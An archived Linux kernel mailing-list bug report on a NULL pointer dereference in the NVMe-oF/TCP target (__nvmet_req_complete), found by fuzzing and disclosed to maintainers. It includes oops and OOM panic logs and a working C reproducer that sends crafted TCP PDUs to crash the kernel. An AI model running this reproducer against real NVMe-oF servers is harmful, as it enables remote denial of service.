Return-Path: <linux-nvme-bounces+linux-nvme=archiver.kernel.org@lists.infradead.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from bombadil.infradead.org (bombadil.infradead.org [198.137.202.133])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id CAA93C4332F
	for <linux-nvme@archiver.kernel.org>; Mon,  6 Nov 2023 13:42:23 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.infradead.org; s=bombadil.20210309; h=Sender:List-Subscribe:List-Help
	:List-Post:List-Archive:List-Unsubscribe:List-Id:Content-Type:Cc:To:Subject:
	Message-ID:Date:From:MIME-Version:Reply-To:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=DAhilsBS9Dc9gQ631xNtpKjcVLQ07606szLfAXUNUYw=; b=T8hkrgmXfZ2qGcW6JxlDmYewSD
	yThduWpPOJVALpl8ROtOdKqPa8FYW3RkQ7XaudFu9nY36Y+PUrnKkSVc2uaq61wxdT02MdBj7yRmK
	zllX9jPhvb+F/MQy5yGqHw57M+5Vxolswn5C5+9jVYwpA63zy84TtNc94hr/6hh0lf12xTfPmNvSe
	PMks7xaJ8l8y623VgzaXJh2kGDZL6r1i4t4820MTgJfj5AOwgH5LSVFa3wUlSymERHqU9le+irKA4
	PRxJl3mAxbExB/x2BKsFf9suteeTvOUF3a8vyYKDPpE7ugnf8hfiGNi4xpmYYJrbAGoNGGFW8zqSL
	h+IrynAA==;
Received: from localhost ([::1] helo=bombadil.infradead.org)
	by bombadil.infradead.org with esmtp (Exim 4.96 #2 (Red Hat Linux))
	id 1qzzrx-00GlY0-2v;
	Mon, 06 Nov 2023 13:42:21 +0000
Received: from mail-ej1-x629.google.com ([2a00:1450:4864:20::629])
	by bombadil.infradead.org with esmtps (Exim 4.96 #2 (Red Hat Linux))
	id 1qzzrs-00GlVG-13
	for linux-nvme@lists.infradead.org;
	Mon, 06 Nov 2023 13:42:20 +0000
Received: by mail-ej1-x629.google.com with SMTP id a640c23a62f3a-9dbb3e0ff65so610232466b.1
        for <linux-nvme@lists.infradead.org>; Mon, 06 Nov 2023 05:42:10 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1699278129; x=1699882929; darn=lists.infradead.org;
        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=DAhilsBS9Dc9gQ631xNtpKjcVLQ07606szLfAXUNUYw=;
        b=fpH+PRaPjzsSrhfLoyd5j8tBPXTyS/+FC3Uw+a97IxrMu+POevunODDukZRur+Sihk
         z/+/vozmsZmOkKCOqw8NVPVs+VK7LDQD252SoZNYujT5K9WEAXV2lEQdd9DtfEYHjzaI
         trD9CvdtvhfG0NM615dCESrcDSv3c2Sx2WgXnG7eXVjcVTJukuA6SLi56UC/Tfr0HdYV
         t7+hk1RAWSOS6uKj+wJhAbmW43cJA1PMCQQE0lvGTowgev139SiVk7NE4T6DwJmUF1Ai
         HmbAJ8l+5y9or9gMHhiXTf7QQWtx2CFF5uHm2exjAJDHubEqrESAoNv+4aQngNVtUFnC
         E3dA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1699278129; x=1699882929;
        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=DAhilsBS9Dc9gQ631xNtpKjcVLQ07606szLfAXUNUYw=;
        b=DCJ5eKpJBP/q35i0eNqnL0U4AolBW3qP5LY4qO/yFAJ+JXTn85Oc7GiCQTWfMrbZaM
         wNFJP0sdGhgjgc9V18eSKUvTqCZw4RRH22PyUyK1rftGmuR2Vs07FpHEqmhKpEsUaKu3
         07Lq0D1BPSSj3iCV4fWVeIAXSFvuDjZqLYCQKhbW6qiD73hHScbwlluuNfWz8Y37l/Y/
         7gKzc1ffSjNdNpYNSOtYMKDIXYFaddmkQrBDEu+h/CfkTjQ2c6gAm3T9X4vmi5k1qxt5
         brkP1LV19qSxn2+Qv8JHX8xEGRiQoGzxeCNR5M9Yk8+YD1a0U0mSaDQCdhMm5kC68YLl
         4C8w==
X-Gm-Message-State: AOJu0YytM+cvbJgYJIUQEqzDRLokDVXh0iTQrlfN4UDWZjQEe9SngjRl
	qa9ShA6W9uQokEPP0EpURHrfZXh3y3yw1do/Yiqk/UxqbCbH2b+K
X-Google-Smtp-Source: AGHT+IHvQkPTuVMOFCWCQbuD4tk86yUqg9wYqtsjc3WTWQqzj6tcS3VgGMBYj59zxjyr8NXvALsfPxTQPfb1UlhTTdI=
X-Received: by 2002:a17:907:2d27:b0:9a2:225a:8d01 with SMTP id
 gs39-20020a1709072d2700b009a2225a8d01mr14818318ejc.7.1699278128961; Mon, 06
 Nov 2023 05:42:08 -0800 (PST)
MIME-Version: 1.0
From: Alon Zahavi <zahavi.alon@gmail.com>
Date: Mon, 6 Nov 2023 15:41:57 +0200
Message-ID: <CAK5usQuREC_n2dyTrv740v0PiddP2sdKKBqJG3kwbogZh+pv1Q@mail.gmail.com>
Subject: [Bug Report] NVMe-oF/TCP - NULL Pointer Dereference in `__nvmet_req_complete`
To: linux-nvme@lists.infradead.org
Cc: Sagi Grimberg <sagi@grimberg.me>, Chaitanya Kulkarni <chaitanyak@nvidia.com>, 
	Christoph Hellwig <hch@lst.de>
Content-Type: text/plain; charset="UTF-8"
X-CRM114-Version: 20100106-BlameMichelson ( TRE 0.8.0 (BSD) ) MR-646709E3 
X-CRM114-CacheID: sfid-20231106_054216_375302_7E3A6A71 
X-CRM114-Status: GOOD (  13.31  )
X-BeenThere: linux-nvme@lists.infradead.org
X-Mailman-Version: 2.1.34
Precedence: list
List-Id: <linux-nvme.lists.infradead.org>
List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-nvme>,
 <mailto:linux-nvme-request@lists.infradead.org?subject=unsubscribe>
List-Archive: <http://lists.infradead.org/pipermail/linux-nvme/>
List-Post: <mailto:linux-nvme@lists.infradead.org>
List-Help: <mailto:linux-nvme-request@lists.infradead.org?subject=help>
List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-nvme>,
 <mailto:linux-nvme-request@lists.infradead.org?subject=subscribe>
Sender: "Linux-nvme" <linux-nvme-bounces@lists.infradead.org>
Errors-To: linux-nvme-bounces+linux-nvme=archiver.kernel.org@lists.infradead.org

# Bug Overview

## The Bug
A null-ptr-deref in `__nvmet_req_complete`.

## Bug Location
`drivers/nvme/target/core.c` in the function `__nvmet_req_complete`.

## Bug Class
Remote Denial of Service

## Disclaimer:
This bug was found using Syzkaller with NVMe-oF/TCP added support.

# Technical Details

## Kernel Report - NULL Pointer Dereference

BUG: kernel NULL pointer dereference, address: 0000000000000020
#PF: supervisor read access in kernel mode
#PF: error_code(0x0000) - not-present page
PGD 0 P4D 0
Oops: 0000 [#1] PREEMPT SMP NOPTI
CPU: 2 PID: 31 Comm: kworker/2:0H Kdump: loaded Not tainted 6.5.0-rc1+ #5
Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop
Reference Platform, BIOS 6.00 11/12/2020
Workqueue: nvmet_tcp_wq nvmet_tcp_io_work
RIP: 0010:__nvmet_req_complete+0x33/0x350 drivers/nvme/target/core.c:740
Code: 41 57 41 56 41 55 41 54 49 89 fc 53 89 f3 48 83 ec 08 66 89 75
d6 e8 dc cd 1a ff 4d 8b 6c 24 10 bf 01 00 00 00 4d 8b 74 24 20 <45> 0f
b6 7d 20 44 89 fe e8 60 c8 1a ff 41 80 ff 01 0f 87 ef 75 96
RSP: 0018:ffffc90000527c00 EFLAGS: 00010293
RAX: 0000000000000000 RBX: 0000000000004002 RCX: 0000000000000000
RDX: ffff888100c74880 RSI: ffffffff82170d04 RDI: 0000000000000001
RBP: ffffc90000527c30 R08: 0000000000000001 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000000 R12: ffff8881292a13e8
R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
FS:  0000000000000000(0000) GS:ffff888233f00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000000000020 CR3: 0000000003c6a005 CR4: 00000000007706e0
PKRU: 55555554
Call Trace:
 <TASK>
 nvmet_req_complete+0x2c/0x40 drivers/nvme/target/core.c:761
 nvmet_tcp_handle_h2c_data_pdu drivers/nvme/target/tcp.c:981
 nvmet_tcp_done_recv_pdu drivers/nvme/target/tcp.c:1020
 nvmet_tcp_try_recv_pdu+0x1132/0x1310 drivers/nvme/target/tcp.c:1182
 nvmet_tcp_try_recv_one drivers/nvme/target/tcp.c:1306
 nvmet_tcp_try_recv drivers/nvme/target/tcp.c:1338
 nvmet_tcp_io_work+0xe6/0xd90 drivers/nvme/target/tcp.c:1388
 process_one_work+0x3da/0x870 kernel/workqueue.c:2597
 worker_thread+0x67/0x640 kernel/workqueue.c:2748
 kthread+0x164/0x1b0 kernel/kthread.c:389
 ret_from_fork+0x29/0x50 arch/x86/entry/entry_64.S:308
 </TASK>

## Description

### Tracing The Bug
The bug occurs during the execution of __nvmet_req_complete. Looking
in the report generated by syzkaller, we can see the exact line of
code that triggers the bug.

Code Block 1:
```
static void __nvmet_req_complete(struct nvmet_req *req, u16 status)
{
struct nvmet_ns *ns = req->ns;

if (!req->sq->sqhd_disabled) // 1
nvmet_update_sq_head(req);

  ..
}
```

In the first code block, we can see that there is a dereference of
`req->sq` when checking the condition `if (!req->sq->sqhd_disabled)`.
However, when executing the reproducer, `req->sq` is NULL. When trying
to dereference it, the kernel triggers a panic.

## Root Cause
`req` is initialized during `nvmet_req_init`. However, the sequence
that leads into `__nvmet_req_complete` does not contain any call for
`nvmet_req_init`, thus crashing the kernel with NULL pointer
dereference. This flow of execution can also create a situation where
an uninitialized memory address will be dereferenced, which has
undefined behaviour.

## Reproducer
I am adding a reproducer generated by Syzkaller with some
optimizations and minor changes.

```
// autogenerated by syzkaller (<https://github.com/google/syzkaller>)

#define _GNU_SOURCE

#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <linux/capability.h>

uint64_t r[1] = {0xffffffffffffffff};

void loop(void)
{
  intptr_t res = 0;
  res = syscall(__NR_socket, /*domain=*/2ul, /*type=*/1ul, /*proto=*/0);
  if (res != -1)
    r[0] = res;
  *(uint16_t*)0x20000100 = 2;
  *(uint16_t*)0x20000102 = htobe16(0x1144);
  *(uint32_t*)0x20000104 = htobe32(0x7f000001);
  syscall(__NR_connect, /*fd=*/r[0], /*addr=*/0x20000100ul, /*addrlen=*/0x10ul);
  *(uint8_t*)0x200001c0 = 0;
  *(uint8_t*)0x200001c1 = 0;
  *(uint8_t*)0x200001c2 = 0x80;
  *(uint8_t*)0x200001c3 = 0;
  *(uint32_t*)0x200001c4 = 0x80;
  *(uint16_t*)0x200001c8 = 0;
  *(uint8_t*)0x200001ca = 0;
  *(uint8_t*)0x200001cb = 0;
  *(uint32_t*)0x200001cc = 0;
  memcpy((void*)0x200001d0,
         "\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf"
         "\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf"
         "\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35"
         "\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86"
         "\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf"
         "\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf"
         "\\x35\\x86\\xcf\\xbf\\x35\\x86\\xcf\\xbf\\x35\\x86",
         112);
  syscall(__NR_sendto, /*fd=*/r[0], /*pdu=*/0x200001c0ul, /*len=*/0x80ul,
          /*f=*/0ul, /*addr=*/0ul, /*addrlen=*/0ul);
  *(uint8_t*)0x20000080 = 6;
  *(uint8_t*)0x20000081 = 3;
  *(uint8_t*)0x20000082 = 0x18;
  *(uint8_t*)0x20000083 = 0x1c;
  *(uint32_t*)0x20000084 = 2;
  *(uint16_t*)0x20000088 = 0x5d;
  *(uint16_t*)0x2000008a = 3;
  *(uint32_t*)0x2000008c = 0;
  *(uint32_t*)0x20000090 = 7;
  memcpy((void*)0x20000094, "\\x83\\x9e\\x4f\\x1a", 4);
  syscall(__NR_sendto, /*fd=*/r[0], /*pdu=*/0x20000080ul, /*len=*/0x80ul,
          /*f=*/0ul, /*addr=*/0ul, /*addrlen=*/0ul);
}
int main(void)
{
  syscall(__NR_mmap, /*addr=*/0x1ffff000ul, /*len=*/0x1000ul, /*prot=*/0ul,
          /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
  syscall(__NR_mmap, /*addr=*/0x20000000ul, /*len=*/0x1000000ul, /*prot=*/7ul,
          /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
  syscall(__NR_mmap, /*addr=*/0x21000000ul, /*len=*/0x1000ul, /*prot=*/0ul,
          /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
  loop();
  return 0;
}
```

### More information
When trying to reproduce the bug, this bug sometimes changes from a
null-ptr-deref into OOM (out of memory) panic.
This implies that there might be another memory corruption that also
happens before the dereferencing of NULL. I couldn't find the root
cause for the OOM bug. However, I am attaching the kernel log for that
bug below.
```
kworker/u2:1 invoked oom-killer:
gfp_mask=0xcd0(GFP_KERNEL|__GFP_RECLAIMABLE), order=0, oom_score_adj=0
CPU: 0 PID: 22 Comm: kworker/u2:1 Not tainted 6.5.0-rc1+ #5
Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop
Reference Platform, BIOS 6.00 11/12/2020
Workqueue: eval_map_wq tracer_init_tracefs_work_func
Call Trace:
 <TASK>
 __dump_stack lib/dump_stack.c:88
 dump_stack_lvl+0xe1/0x110 lib/dump_stack.c:106
 dump_stack+0x19/0x20 lib/dump_stack.c:113
 dump_header+0x5c/0x7c0 mm/oom_kill.c:460
 out_of_memory+0x764/0xb10 mm/oom_kill.c:1161
 __alloc_pages_may_oom mm/page_alloc.c:3393
 __alloc_pages_slowpath mm/page_alloc.c:4153
 __alloc_pages+0xe87/0x1220 mm/page_alloc.c:4490
 alloc_pages+0xd7/0x200 mm/mempolicy.c:2279
 alloc_slab_page mm/slub.c:1862
 allocate_slab+0x37e/0x500 mm/slub.c:2017
 new_slab mm/slub.c:2062
 ___slab_alloc+0x9c6/0x1250 mm/slub.c:3215
 __slab_alloc mm/slub.c:3314
 __slab_alloc_node mm/slub.c:3367
 slab_alloc_node mm/slub.c:3460
 slab_alloc mm/slub.c:3478
 __kmem_cache_alloc_lru mm/slub.c:3485
 kmem_cache_alloc_lru+0x45e/0x5d0 mm/slub.c:3501
 __d_alloc+0x3d/0x2f0 fs/dcache.c:1769
 d_alloc fs/dcache.c:1849
 d_alloc_parallel+0x75/0x1040 fs/dcache.c:2638
 __lookup_slow+0xf4/0x2a0 fs/namei.c:1675
 lookup_one_len+0xde/0x100 fs/namei.c:2742
 start_creating+0xaf/0x180 fs/tracefs/inode.c:426
 tracefs_create_file+0xa2/0x260 fs/tracefs/inode.c:493
 trace_create_file+0x38/0x70 kernel/trace/trace.c:9014
 event_create_dir+0x4c0/0x6e0 kernel/trace/trace_events.c:2470
 __trace_early_add_event_dirs+0x57/0x100 kernel/trace/trace_events.c:3570
 early_event_add_tracer kernel/trace/trace_events.c:3731
 event_trace_init+0xe4/0x160 kernel/trace/trace_events.c:3888
 tracer_init_tracefs_work_func+0x15/0x440 kernel/trace/trace.c:9904
 process_one_work+0x3da/0x870 kernel/workqueue.c:2597
 worker_thread+0x67/0x640 kernel/workqueue.c:2748
 kthread+0x164/0x1b0 kernel/kthread.c:389
 ret_from_fork+0x29/0x50 arch/x86/entry/entry_64.S:308
 </TASK>
Mem-Info:
active_anon:0 inactive_anon:0 isolated_anon:0
 active_file:0 inactive_file:0 isolated_file:0
 unevictable:0 dirty:0 writeback:0
 slab_reclaimable:2207 slab_unreclaimable:3054
 mapped:0 shmem:0 pagetables:3
 sec_pagetables:0 bounce:0
 kernel_misc_reclaimable:0
 free:691 free_pcp:2 free_cma:0
Node 0 active_anon:0kB inactive_anon:0kB active_file:0kB
inactive_file:0kB unevictable:0kB isolated(anon):0kB
isolated(file):0kB mapped:0kB dirty:0kB writeback:0kB shmem:0kB
shmem_thp: 0kB shmem_pmdmapped: 0kB anon_thp: 0kB writeback_tmp:0kB
kernel_stack:624kB pagetables:12kB sec_pagetables:0kB
all_unreclaimable? no
Node 0 DMA free:0kB boost:0kB min:0kB low:0kB high:0kB
reserved_highatomic:0KB active_anon:0kB inactive_anon:0kB
active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB
present:600kB managed:0kB mlocked:0kB bounce:0kB free_pcp:0kB
local_pcp:0kB free_cma:0kB
lowmem_reserve[]: 0 0 0 0 0
Node 0 DMA32 free:2764kB boost:2048kB min:2764kB low:2940kB
high:3116kB reserved_highatomic:0KB active_anon:0kB inactive_anon:0kB
active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB
present:195988kB managed:32344kB mlocked:0kB bounce:0kB free_pcp:8kB
local_pcp:8kB free_cma:0kB
lowmem_reserve[]: 0 0 0 0 0
Node 0 DMA: 0*4kB 0*8kB 0*16kB 0*32kB 0*64kB 0*128kB 0*256kB 0*512kB
0*1024kB 0*2048kB 0*4096kB = 0kB
Node 0 DMA32: 3*4kB (ME) 0*8kB 4*16kB (UM) 2*32kB (UM) 1*64kB (U)
2*128kB (UM) 1*256kB (M) 2*512kB (UE) 1*1024kB (U) 0*2048kB 0*4096kB =
2764kB
Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0
hugepages_size=1048576kB
Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=2048kB
0 total pagecache pages
0 pages in swap cache
Free swap  = 0kB
Total swap = 0kB
49147 pages RAM
0 pages HighMem/MovableOnly
41061 pages reserved
0 pages hwpoisoned
Unreclaimable slab info:
Name                      Used          Total
bio_crypt_ctx              7KB          7KB
bio-200                    4KB          4KB
biovec-max                32KB         32KB
biovec-128                16KB         16KB
biovec-64                  8KB          8KB
dmaengine-unmap-256         30KB         30KB
dmaengine-unmap-128         15KB         15KB
skbuff_ext_cache           3KB          3KB
skbuff_small_head          7KB          7KB
skbuff_head_cache          4KB          4KB
proc_dir_entry            44KB         44KB
shmem_inode_cache         15KB         15KB
kernfs_node_cache       4559KB       4559KB
mnt_cache                  7KB          7KB
names_cache               32KB         32KB
lsm_inode_cache          139KB        139KB
nsproxy                    3KB          3KB
files_cache               15KB         15KB
signal_cache              62KB         62KB
sighand_cache             91KB         91KB
task_struct              353KB        353KB
cred_jar                   7KB          7KB
pid                       12KB         12KB
Acpi-ParseExt              3KB          3KB
Acpi-State                 3KB          3KB
shared_policy_node        390KB        390KB
numa_policy                3KB          3KB
perf_event                30KB         30KB
trace_event_file         142KB        142KB
ftrace_event_field        231KB        231KB
pool_workqueue            12KB         12KB
maple_node                 4KB          4KB
mm_struct                 30KB         30KB
vmap_area                696KB        696KB
page->ptl                  4KB          4KB
kmalloc-cg-4k             32KB         32KB
kmalloc-cg-2k             16KB         16KB
kmalloc-cg-1k              8KB          8KB
kmalloc-cg-512             8KB          8KB
kmalloc-cg-256             4KB          4KB
kmalloc-cg-192             3KB          3KB
kmalloc-cg-128             4KB          4KB
kmalloc-cg-96              3KB          3KB
kmalloc-cg-32              4KB          4KB
kmalloc-cg-16              4KB          4KB
kmalloc-cg-8               4KB          4KB
kmalloc-8k                64KB         64KB
kmalloc-4k               288KB        288KB
kmalloc-2k              2656KB       2656KB
kmalloc-1k               184KB        184KB
kmalloc-512              736KB        736KB
kmalloc-256               44KB         44KB
kmalloc-192               55KB         55KB
kmalloc-128               28KB         28KB
kmalloc-96                43KB         43KB
kmalloc-64                84KB         84KB
kmalloc-32                72KB         72KB
kmalloc-16                68KB         68KB
kmalloc-8                 20KB         20KB
kmem_cache_node           16KB         16KB
kmem_cache                32KB         32KB
Tasks state (memory values in pages):
[  pid  ]   uid  tgid total_vm      rss pgtables_bytes swapents
oom_score_adj name
Out of memory and no killable processes...
Kernel panic - not syncing: System is deadlocked on memory
CPU: 0 PID: 22 Comm: kworker/u2:1 Not tainted 6.5.0-rc1+ #5
Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop
Reference Platform, BIOS 6.00 11/12/2020
Workqueue: eval_map_wq tracer_init_tracefs_work_func
Call Trace:
 <TASK>
 __dump_stack lib/dump_stack.c:88
 dump_stack_lvl+0xaa/0x110 lib/dump_stack.c:106
 dump_stack+0x19/0x20 lib/dump_stack.c:113
 panic+0x567/0x5b0 kernel/panic.c:340
 out_of_memory+0xb0d/0xb10 mm/oom_kill.c:1169
 __alloc_pages_may_oom mm/page_alloc.c:3393
 __alloc_pages_slowpath mm/page_alloc.c:4153
 __alloc_pages+0xe87/0x1220 mm/page_alloc.c:4490
 alloc_pages+0xd7/0x200 mm/mempolicy.c:2279
 alloc_slab_page mm/slub.c:1862
 allocate_slab+0x37e/0x500 mm/slub.c:2017
 new_slab mm/slub.c:2062
 ___slab_alloc+0x9c6/0x1250 mm/slub.c:3215
 __slab_alloc mm/slub.c:3314
 __slab_alloc_node mm/slub.c:3367
 slab_alloc_node mm/slub.c:3460
 slab_alloc mm/slub.c:3478
 __kmem_cache_alloc_lru mm/slub.c:3485
 kmem_cache_alloc_lru+0x45e/0x5d0 mm/slub.c:3501
 __d_alloc+0x3d/0x2f0 fs/dcache.c:1769
 d_alloc fs/dcache.c:1849
 d_alloc_parallel+0x75/0x1040 fs/dcache.c:2638
 __lookup_slow+0xf4/0x2a0 fs/namei.c:1675
 lookup_one_len+0xde/0x100 fs/namei.c:2742
 start_creating+0xaf/0x180 fs/tracefs/inode.c:426
 tracefs_create_file+0xa2/0x260 fs/tracefs/inode.c:493
 trace_create_file+0x38/0x70 kernel/trace/trace.c:9014
 event_create_dir+0x4c0/0x6e0 kernel/trace/trace_events.c:2470
 __trace_early_add_event_dirs+0x57/0x100 kernel/trace/trace_events.c:3570
 early_event_add_tracer kernel/trace/trace_events.c:3731
 event_trace_init+0xe4/0x160 kernel/trace/trace_events.c:3888
 tracer_init_tracefs_work_func+0x15/0x440 kernel/trace/trace.c:9904
 process_one_work+0x3da/0x870 kernel/workqueue.c:2597
 worker_thread+0x67/0x640 kernel/workqueue.c:2748
 kthread+0x164/0x1b0 kernel/kthread.c:389
 ret_from_fork+0x29/0x50 arch/x86/entry/entry_64.S:308
 </TASK>
---[ end Kernel panic - not syncing: System is deadlocked on memory ]---
```
In case you found out what caused the OOM, please let me know.

